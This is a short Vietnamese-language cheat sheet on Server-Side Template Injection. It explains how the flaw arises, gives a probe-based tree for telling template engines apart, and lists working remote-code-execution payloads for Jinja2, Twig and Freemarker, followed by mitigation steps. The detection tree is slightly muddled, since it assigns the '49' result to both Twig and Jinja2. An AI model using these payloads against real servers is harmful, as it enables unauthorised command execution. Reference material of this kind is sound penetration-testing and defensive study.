# 📄 Server-Side Template Injection (SSTI)

## 1. 📌 Tổng quan
SSTI xảy ra khi ứng dụng web nhận input từ người dùng và chèn trực tiếp vào template engine (Jinja2, Twig, Freemarker, Velocity, Smarty...) để render thay vì truyền dưới dạng biến dữ liệu (Data variables), dẫn đến RCE trên máy chủ.

---

## 2. 🔍 Template Engine Identification (Detection Tree)

Thử nghiệm chuỗi toán học `${7*7}` hoặc `{{7*7}}`:
- `{{7*7}}` -> `49` (Tiếp tục thử `{{7*'7'}}`)
  - Nếu ra `49`: Twig / Jinja2
  - Nếu ra `7777777`: Jinja2
- `${7*7}` -> `49`: Smarty, Freemarker, Spring Expression Language (SpEL)

---

## 3. 💣 Cheat Sheet & Payloads

### Jinja2 (Python):
```jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

### Twig (PHP):
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Freemarker (Java):
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

---

## 4. 🛡️ Biện pháp phòng chống (Mitigation)
1. Không bao giờ nối chuỗi input người dùng vào template trước khi compile.
2. Luôn truyền dữ liệu vào template thông qua cơ chế Context / Data Dictionary.
3. Kích hoạt Sandbox Mode trong Template Engine nếu có.
